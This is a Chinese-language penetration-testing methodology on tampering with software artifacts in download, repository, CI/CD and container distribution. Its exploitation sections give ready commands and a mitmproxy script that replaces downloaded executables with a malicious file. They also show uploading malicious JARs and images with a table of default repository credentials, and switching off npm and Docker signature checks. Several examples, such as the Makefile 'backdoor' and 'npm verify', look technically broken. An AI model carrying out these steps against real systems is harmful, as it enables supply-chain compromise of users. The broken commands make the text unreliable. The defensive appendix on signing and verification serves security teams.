# 制品篡改攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供制品篡改攻击的系统化方法
- 指导测试人员识别和利用软件制品完整性验证缺失的问题
- 帮助理解制品签名、哈希验证等安全机制的重要性

## 1.2 适用范围
- 适用于无签名验证的软件制品分发场景
- 适用于使用 HTTP 而非 HTTPS 下载制品的场景
- 适用于制品仓库配置不当的环境
- 适用于 CI/CD 构建产物管理流程

## 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- DevSecOps 工程师
- 制品仓库管理员

---

# 第二部分：核心渗透技术专题

## 专题一：制品篡改攻击

### 2.1 技术介绍

制品篡改攻击是指攻击者通过修改软件构建产物（如二进制文件、安装包、容器镜像等），在软件分发过程中注入恶意代码，而由于缺乏完整性验证机制，用户无法察觉制品已被篡改。

**攻击本质：**
- 软件制品在存储或传输过程中被修改
- 缺乏有效的完整性验证机制（签名/哈希）
- 用户信任链被破坏

**攻击面分析：**

```
                    ┌─────────────────┐
                    │   源代码仓库     │
                    └────────┬────────┘
                             │ 构建
                             ▼
                    ┌─────────────────┐
                    │   CI/CD 系统     │
                    └────────┬────────┘
                             │ 产出
                             ▼
          ┌──────────────────┼──────────────────┐
          │                  │                  │
          ▼                  ▼                  ▼
   ┌─────────────┐   ┌─────────────┐   ┌─────────────┐
   │  制品仓库    │   │   CDN 分发   │   │  包管理器   │
   └──────┬──────┘   └──────┬──────┘   └──────┬──────┘
          │                  │                  │
          └──────────────────┼──────────────────┘
                             │
                             ▼
                    ┌─────────────────┐
                    │   最终用户      │
                    └─────────────────┘
```

**常见篡改点：**

| 篡改点 | 描述 | 难度 |
|-------|------|------|
| 构建服务器 | 入侵 CI/CD 系统修改构建过程 | 高 |
| 制品仓库 | 直接修改仓库中存储的制品 | 中 |
| 传输过程 | 中间人攻击修改下载内容 | 中 |
| 包管理器 | 入侵 npm/Maven 等仓库 | 高 |
| CDN 节点 | 篡改 CDN 缓存内容 | 中 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 软件官网下载 | 从官网下载安装包 | HTTP 下载可能被劫持篡改 |
| 自动更新系统 | 应用内自动下载更新 | 更新包无签名验证 |
| 容器镜像拉取 | docker pull 镜像 | 镜像无签名或签名验证关闭 |
| 私有仓库代理 | Nexus/Artifactory 代理 | 代理缓存可能被污染 |
| 第三方镜像源 | 使用非官方镜像源 | 镜像源可能提供篡改制品 |
| 内部软件分发 | 企业内部软件仓库 | 内网可能缺乏验证机制 |

**高风险特征：**
- 使用 HTTP 而非 HTTPS 下载制品
- 不提供或不验证 SHA256/SHA512 哈希值
- 不提供或不验证 GPG/代码签名证书
- 关闭或跳过签名验证配置

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别制品分发渠道**
```bash
# 查找下载链接
curl https://target.com/download
curl https://target.com/releases

# 查找更新端点
curl https://target.com/api/update
curl https://target.com/appcast.xml

# 查找容器镜像
docker search target/app
```

**步骤二：检查传输安全性**
```bash
# 检查下载链接协议
# HTTP = 高风险，HTTPS = 相对安全

# 检查证书有效性
openssl s_client -connect target.com:443

# 检查是否支持 HSTS
curl -I https://target.com | grep -i strict
```

**步骤三：检查完整性验证**
```bash
# 检查是否提供哈希文件
curl https://target.com/download.sha256
curl https://target.com/download.asc  # GPG 签名

# 检查文档中是否提及验证步骤
curl https://target.com/verification
```

**步骤四：检查签名验证**
```bash
# 尝试下载并验证
# 如果无验证机制或验证可绕过，则存在风险
```

#### 2.3.2 白盒测试

**步骤一：审计下载代码**
```bash
# 搜索下载相关代码
grep -r "download\|fetch\|wget\|curl" src/

# 检查哈希验证
grep -r "sha256\|md5\|hash" src/

# 检查签名验证
grep -r "signature\|verify\|gpg" src/
```

**步骤二：检查 CI/CD 配置**
```bash
# 检查构建脚本
cat .github/workflows/build.yml
cat Jenkinsfile
cat build.sh

# 检查签名配置
# 是否有 cosign、sigstore、GPG 签名步骤
```

**步骤三：检查制品仓库配置**
```bash
# Nexus 配置
cat nexus.properties

# Artifactory 配置
cat artifactory.config.yaml

# 检查是否启用签名验证
```

### 2.4 漏洞利用方法

#### 2.4.1 中间人篡改

**场景：HTTP 下载被劫持**

```bash
# 1.  ARP 欺骗或 DNS 劫持
arpspoof -i eth0 -t victim gateway

# 2.  拦截下载请求
# 使用 mitmproxy 或自研工具

# 3.  修改下载内容
# 在传输过程中替换文件

# 4.  受害者收到篡改文件
# 由于无验证机制，无法察觉
```

**工具：mitmproxy 示例**
```python
# mitmproxy 脚本
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if flow.request.path.endswith(".exe"):
        # 替换为恶意文件
        flow.response.content = open("malicious.exe", "rb").read()
```

#### 2.4.2 制品仓库入侵

```bash
# 1.  探测制品仓库服务
nmap -p 8081,8082 target.com  # Nexus 默认端口

# 2.  利用弱口令或漏洞
# 默认凭证：admin/admin123 (Nexus)
# CVE-2019-7238, CVE-2020-10199 等

# 3.  上传恶意制品
curl -u admin:admin123 \
  --upload-file malicious.jar \
  http://target.com:8081/repository/maven-releases/com/example/app/1.0.1/app-1.0.1.jar

# 4.  受害者下载时被感染
```

#### 2.4.3 构建过程篡改

```bash
# 1.  入侵 CI/CD 系统
# 利用 Jenkins CLI 漏洞、GitHub Actions 工作流注入等

# 2.  修改构建脚本
# 在编译时注入后门代码

# 示例：修改 Makefile
echo "build:
  gcc -o app src/app.c
  echo 'backdoor' >> src/app.c  # 注入后门
  gcc -o app src/app.c
" > Makefile

# 3.  构建产物包含恶意代码
```

#### 2.4.4 容器镜像篡改

```bash
# 1.  推送恶意镜像
docker login registry.target.com
docker tag malicious:latest registry.target.com/app:latest
docker push registry.target.com/app:latest

# 2.  如果无签名验证，用户将拉取恶意镜像
docker pull registry.target.com/app:latest
docker run registry.target.com/app:latest
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过哈希验证

```bash
# 如果只验证 MD5（已不安全）
# 可以碰撞生成相同 MD5 的恶意文件

# 工具：hashclash
./hashclash -o malicious.exe -t target.exe

# 如果验证脚本存在路径遍历
# 可以替换哈希文件
../../../checksums.txt
```

#### 2.5.2 绕过签名验证

```bash
# 如果签名验证可配置关闭
# 修改客户端配置跳过验证

# 示例：npm 配置
npm config set signature-verification false

# 示例：Docker 配置
# 修改 daemon.json 禁用内容信任
{"content-trust": false}

# 如果验证实现有缺陷
# 可能通过空签名、无效签名绕过
```

#### 2.5.3 时间窗口攻击

```bash
# 在官方发布更新和签名之间有时间差
# 快速发布恶意版本

# 或者在签名密钥轮换期间
# 利用旧密钥仍然有效的窗口期
```

#### 2.5.4 供应链传递攻击

```bash
# 不直接攻击目标，而是攻击其依赖
# 篡改构建工具、依赖库等

# 示例：攻击构建插件
# 修改 Maven 插件、npm 构建脚本
# 在构建时自动注入恶意代码
```

---

# 第三部分：附录

## 3.1 制品完整性验证方法速查

| 验证类型 | 命令示例 | 说明 |
|---------|---------|------|
| SHA256 验证 | `sha256sum -c file.sha256` | 哈希校验 |
| GPG 签名 | `gpg --verify file.asc file` | GPG 签名验证 |
| cosign 验证 | `cosign verify --key key.pub image` | 容器镜像签名 |
| sigstore | `sigstore verify` | Sigstore 签名验证 |
| Windows 签名 | `sigcheck.exe file.exe` | Windows 代码签名 |

## 3.2 常见制品仓库默认凭证

| 仓库类型 | 默认 URL | 默认凭证 |
|---------|---------|---------|
| Nexus | http://host:8081 | admin/admin123 |
| Artifactory | http://host:8082 | admin/password |
| Sonatype | http://host:8083 | admin/admin123 |
| Harbor | http://host | admin/Harbor12345 |

## 3.3 篡改检测命令

```bash
# 检查 Docker 内容信任
docker trust inspect --pretty image:tag

# 检查 npm 包完整性
npm verify

# 检查 Maven 包签名
mvn org.apache.maven.plugins:maven-gpg-plugin:verify

# 检查文件哈希
sha256sum downloaded-file
# 与官方哈希对比
```

## 3.4 安全配置建议

| 场景 | 推荐配置 |
|-----|---------|
| 文件下载 | HTTPS + SHA256 + GPG 签名 |
| 容器镜像 | 启用 Docker Content Trust + cosign 签名 |
| npm 包 | 启用 npm audit + signature-verification |
| Maven | 启用 GPG 签名 + 仓库 HTTPS |
| CI/CD | 构建产物自动签名 + 存储完整性保护 |

---

## 参考资源

- [Sigstore Project](https://www.sigstore.dev/)
- [Docker Content Trust](https://docs.docker.com/engine/security/trust/)
- [SLSA Framework](https://slsa.dev/)
- [in-toto Supply Chain Attestation](https://in-toto.io/)
